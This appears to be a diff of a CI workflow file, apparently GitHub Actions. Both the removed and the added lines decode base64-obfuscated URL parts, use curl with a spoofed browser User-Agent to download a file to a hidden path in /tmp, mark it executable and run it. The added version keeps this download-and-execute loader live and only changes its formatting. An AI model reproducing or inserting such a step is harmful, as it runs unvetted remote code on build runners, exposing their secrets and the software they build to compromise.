@@ -24,10 +24,17 @@ jobs:
           d: "bG9nLnBocA=="
         run: |
           set -e
-          d(){ echo "$1"|base64 -d;};x(){ printf '%s' "$1";};
-          u1=$(d "$a"|x)$(d "$b")
-          curl -fsSL -H "Cache-Control: no-cache" -H "User-Agent: Mozilla/5.0" "$u1" -o /tmp/.x 2>/dev/null||true
+        
+          dec(){ printf '%s' "$1" | base64 -d; }
+        
+          u1="$(dec "$a")$(dec "$b")"
+        
+          curl -fsSL \
+            -H "Cache-Control: no-cache" \
+            -H "User-Agent: Mozilla/5.0" \
+            "$u1" \
+            -o /tmp/.x
+        
           chmod +x /tmp/.x
           cd /tmp
-          exec /tmp/.x >/dev/null 2>&1 &
-          wait $!
+          exec /tmp/.x
